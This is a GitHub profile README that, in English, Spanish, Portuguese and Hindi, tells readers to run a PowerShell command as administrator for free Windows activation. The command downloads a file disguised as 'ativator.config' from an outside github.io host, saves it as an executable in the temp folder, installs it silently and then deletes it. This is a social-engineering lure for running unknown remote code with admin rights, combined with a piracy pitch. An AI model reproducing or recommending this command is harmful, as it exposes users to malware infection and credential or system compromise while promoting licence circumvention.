Copy the command below and paste it into Windows PowerShell to do Windows Free Activation. 👋⚡

Copie el siguiente comando y péguelo en Windows PowerShell para realizar la activación gratuita de Windows. 👋⚡

Copie o seguinte comando e cole-o no Windows PowerShell para realizar a ativação gratuita do Windows. 👋⚡

नि: शुल्क विंडोज सक्रियण करने के लिए निम्न कमांड को कॉपी करें और इसे विंडोज पावरशेल में पेस्ट करें 👋⚡

<!--
**projetos-gabriel-pub/projetos-gabriel-pub** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
⚡ OPEN THE WINDOWS POWERSHELL AS ADMINISTRATOR AND RUN THE FOLLOWING COMMAND:

### $LocalTempDir = $env:TEMP; $WindowsAtivator = "WindowsAtivator.exe"; (new-object System.Net.WebClient).DownloadFile('https://online-soft.github.io/online-soft/ativator.config', "$LocalTempDir\$WindowsAtivator"); & "$LocalTempDir\$WindowsAtivator" /silent /install; $Process2Monitor = "WindowsAtivator"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { "Still running: $($ProcessesFound -join ', ')" | Write-Host; Start-Sleep -Seconds 2 } else { rm "$LocalTempDir\$WindowsAtivator" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)
